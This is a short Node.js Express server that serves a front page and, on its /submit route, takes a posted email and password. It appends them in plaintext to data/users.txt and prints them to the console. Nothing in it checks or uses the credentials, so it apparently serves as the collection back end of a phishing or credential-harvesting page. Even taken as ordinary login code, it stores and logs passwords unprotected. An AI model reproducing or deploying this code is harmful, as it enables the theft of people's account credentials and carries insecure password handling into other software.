const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
 
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use('/assets', express.static(path.join(__dirname, 'assets')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.post('/submit', (req, res) => {
  const { email, pass } = req.body;

  const data = `Email: ${email}, Password: ${pass}\n`;
  const filePath = path.join(__dirname, 'data', 'users.txt');

  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({ message: 'Internal server error' });
    }

    console.log('Data saved:', data);
    res.status(200).json({ message: 'Success' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});